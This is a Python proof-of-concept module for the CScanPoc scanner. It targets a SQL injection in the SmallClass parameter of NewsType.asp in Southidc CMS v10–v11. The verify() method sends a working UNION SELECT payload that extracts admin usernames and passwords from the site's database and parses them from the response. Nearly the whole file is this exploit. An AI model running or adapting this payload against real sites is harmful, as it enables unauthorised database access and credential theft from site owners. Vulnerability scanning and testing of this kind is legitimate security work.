# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Southidc_0102'  # 平台漏洞编号，留空
    name = 'Southidc(南方数据)/v11.0 /NewsType.asp SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-29'  # 漏洞公布时间
    desc = '''
        南方数据企业CMS、企业网站SEO、网站优化、SEO搜索引擎优化机制、自助建站系统、前台全站采用静态html页面模板自动生成。
        southidc v10.0到v11.0版本中NewsType.asp文件对SmallClass参数没有适当过滤，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://sebug.net/vuldb/ssvid-62399'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Southidc'  # 漏洞应用名称
    product_version = '11.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c3a75e6f-c79e-4860-823c-c8508d9db833'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            exp = ("/NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword"
                   ",2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201"
                   "=2%20and%20''='")
            verify_url = self.target + exp
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            pattern = re.compile(
                r'.*?\\">(?P<username>[a-zA-Z0-9]+)\\|(?P<password>[a-zA-Z0-9]+)', re.I | re.S)
            match = pattern.match(content)
            if match == None:
                return
            username = match.group("username")
            password = match.group("password")
            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
